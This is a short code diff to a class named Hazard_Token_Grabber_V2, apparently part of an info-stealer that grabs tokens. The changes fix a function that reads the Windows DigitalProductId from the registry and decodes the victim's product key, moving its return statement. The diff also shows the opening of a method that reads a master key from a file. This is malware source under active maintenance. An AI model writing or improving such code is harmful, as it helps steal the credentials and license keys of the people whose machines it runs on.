@@ -166,7 +166,7 @@ class Hazard_Token_Grabber_V2:
             try:
                 val, _ = winreg.QueryValueEx(regkey, 'DigitalProductId')
                 key = list(val)
-
+    
                 for i in range(24,-1, -1):
                     temp = 0
                     for j in range(14,-1,-1):
@@ -183,9 +183,9 @@ class Hazard_Token_Grabber_V2:
                     wkey = chars[temp] + wkey
                 for i in range(5,len(wkey),6):
                     wkey = wkey[:i] + '-' + wkey[i:]
+                return [productName, wkey]
             except Exception:
                 return [productName, "No Key Extracted"]
-            return [productName, wkey]
 
     def get_master_key(self, path):
         with open(path, "r", encoding="utf-8") as f:
